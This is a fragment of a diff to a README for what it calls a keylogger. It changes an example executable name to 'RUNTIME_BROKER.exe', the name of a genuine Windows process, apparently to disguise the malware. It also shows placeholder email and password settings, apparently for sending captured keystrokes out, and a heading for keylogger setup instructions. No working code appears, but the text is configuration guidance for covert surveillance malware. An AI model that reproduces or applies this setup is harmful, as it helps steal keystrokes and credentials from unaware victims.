@@ -18,8 +18,8 @@ Update the following variables in your configuration file:
 
 ### Example Configuration
 
-```python
-file_name_to_find = "NAME_OF_EXECUTABLE.exe"
+python
+file_name_to_find = "RUNTIME_BROKER.exe"
 email = 'YOUR_EMAIL'
 password = 'PASSWORD'
 ## Keylogger Setup Instructions
